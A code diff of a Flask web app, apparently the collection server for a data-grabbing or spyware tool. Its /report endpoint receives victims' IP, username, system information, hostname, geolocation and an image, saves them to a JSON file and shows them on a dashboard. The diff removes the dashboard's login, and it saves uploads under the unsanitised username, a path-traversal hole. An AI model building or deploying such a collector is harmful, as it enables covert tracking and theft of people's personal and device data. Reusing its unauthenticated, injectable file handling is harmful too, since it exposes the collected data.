@@ -1,104 +1,73 @@
-from flask import Flask, request, render_template, redirect, url_for, session, send_from_directory
+from flask import Flask, request, render_template, send_from_directory
 from datetime import datetime
-import json
 import os
-import time
-import requests  # Asegúrate de que requests esté instalado
-import socket
-import platform
+import json
 
 app = Flask(__name__)
-app.secret_key = "supersecretkey"
 
 UPLOAD_FOLDER = 'static/uploads'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-# Ruta principal para mostrar reportes
-@app.route('/')
+REPORTES_JSON = 'reportes.json'
+
+if not os.path.exists(REPORTES_JSON):
+    with open(REPORTES_JSON, 'w') as f:
+        json.dump([], f)
+
+@app.route("/")
 def index():
-    if not session.get("logged_in"):
-        return redirect(url_for("login"))
+    with open(REPORTES_JSON, 'r') as f:
+        reportes = json.load(f)
+    return render_template("index.html", reportes=reportes[::-1])
 
-    if not os.path.exists("reportes.json"):
-        with open("reportes.json", "w") as f:
-            json.dump([], f)
-
-    with open("reportes.json", "r") as f:
-        data = json.load(f)
-
-    reports = []
-    for idx, r in enumerate(data):
-        reports.append([
-            idx + 1,
-            r.get("ip", "Sin dato"),
-            r.get("username", "Sin dato"),
-            r.get("system_info", "Sin dato"),
-            r.get("timestamp", "Sin dato"),
-            r.get("image", None)
-        ])
-
-    return render_template("index.html", reports=reports)
-
-# Ruta para recibir los reportes
-@app.route('/report', methods=['POST'])
+@app.route("/report", methods=["POST"])
 def report():
-    ip = request.form.get('ip')
-    username = request.form.get('username')
-    system_info = request.form.get('system_info')
-    image = request.files.get('image')
-    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    try:
+        ip = request.form.get("ip", "No recibido")
+        username = request.form.get("username", "No recibido")
+        system_info = request.form.get("system_info", "No recibido")
+        hostname = request.form.get("hostname", "N/A")
+        hora = request.form.get("hora", str(datetime.now()))
+        ciudad = request.form.get("ciudad", "N/A")
+        region = request.form.get("region", "N/A")
+        pais = request.form.get("pais", "N/A")
+        loc = request.form.get("loc", "N/A")
 
-    image_filename = None
-    if image:
-        image_filename = f"{int(time.time())}.jpg"
-        image_path = os.path.join(UPLOAD_FOLDER, image_filename)
-        image.save(image_path)
+        image_file = request.files.get("image")
+        image_filename = None
+        if image_file:
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            image_filename = f"{username}_{timestamp}.jpg"
+            image_path = os.path.join(UPLOAD_FOLDER, image_filename)
+            image_file.save(image_path)
 
-    if not os.path.exists("reportes.json"):
-        with open("reportes.json", "w") as f:
-            json.dump([], f)
+        nuevo_reporte = {
+            "ip": ip,
+            "username": username,
+            "system_info": system_info,
+            "hostname": hostname,
+            "hora": hora,
+            "ciudad": ciudad,
+            "region": region,
+            "pais": pais,
+            "loc": loc,
+            "imagen": image_filename
+        }
 
-    with open("reportes.json", "r") as f:
-        data = json.load(f)
+        with open(REPORTES_JSON, 'r') as f:
+            reportes = json.load(f)
+        reportes.append(nuevo_reporte)
+        with open(REPORTES_JSON, 'w') as f:
+            json.dump(reportes, f, indent=2)
 
-    data.insert(0, {
-        "ip": ip,
-        "username": username,
-        "system_info": system_info,
-        "timestamp": timestamp,
-        "image": image_filename
-    })
+        return "Reporte recibido correctamente", 200
+    except Exception as e:
+        return f"Error al procesar reporte: {e}", 500
 
-    with open("reportes.json", "w") as f:
-        json.dump(data, f, indent=2)
-
-    return "Reporte recibido", 200
-
-# Ruta para mostrar imágenes de los reportes
 @app.route("/uploads/<filename>")
 def uploaded_file(filename):
     return send_from_directory(UPLOAD_FOLDER, filename)
 
-# Ruta de login
-@app.route('/login', methods=['GET', 'POST'])
-def login():
-    if request.method == "POST":
-        user = request.form.get("username")
-        pw = request.form.get("password")
-        if user == "admin" and pw == "admin123":
-            session["logged_in"] = True
-            return redirect(url_for("index"))
-        else:
-            return "Credenciales incorrectas", 403
-    return render_template("login.html")
-
-# Ruta para logout
-@app.route('/logout')
-def logout():
-    session.clear()
-    return redirect(url_for("login"))
-
-if __name__ == '__main__':
-    # Asegúrate de usar el puerto proporcionado por Render
-    port = os.environ.get("PORT", 5000)  # Usando el puerto del entorno de Render
-    app.run(host="0.0.0.0", port=int(port), debug=True)
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))  # Para Render
+    app.run(host="0.0.0.0", port=port)
